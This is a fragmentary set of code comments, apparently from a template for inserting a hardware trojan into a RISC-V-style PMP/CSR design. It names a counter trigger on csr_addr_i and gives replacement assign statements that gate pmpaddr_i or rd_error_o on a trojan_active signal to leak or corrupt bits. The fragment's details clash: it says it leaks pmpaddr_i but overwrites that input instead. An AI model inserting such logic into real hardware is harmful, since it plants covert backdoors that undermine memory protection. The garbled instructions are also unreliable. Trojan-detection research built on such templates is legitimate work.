 ...
 *   
 * Trigger: Counter on csr_addr_i
 * Payload: Route pmpaddr_i[0] to observable output
 * 
...
//   Find the assign for pmpaddr_i (or rd_error_o as fallback):
//     assign pmpaddr_i = <normal_expr>;
//   Replace with:
//     assign pmpaddr_i = trojan_active ? csr_addr_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? csr_addr_i[0] : 1'b0;
//
